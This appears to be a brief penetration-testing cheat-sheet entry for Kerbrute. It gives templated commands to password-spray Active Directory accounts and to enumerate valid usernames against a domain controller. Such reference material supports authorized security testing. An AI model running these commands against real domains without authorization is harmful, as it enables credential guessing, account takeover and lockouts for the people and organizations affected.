# Kerbrute

## Kerbrute

### Password spray

Dump password spray with Kerbrute.

```sh title:"Kerbrute Dump Password Spray"
kerbrute passwordspray $wordlists_users -d $domain $pass --dc $rhost_ip -v
```
<!-- cheat
import domain_ip
import hashcat
var wordlists_users
var pass
-->

### User enumeration

Enumerate user enumeration with Kerbrute.

```sh title:"Kerbrute Enumerate User Enumeration"
kerbrute userenum $wordlists_users -d $domain --dc $rhost_ip -v | grep -v "User does not exist"
```
<!-- cheat
import domain_ip
import hashcat
var wordlists_users
-->

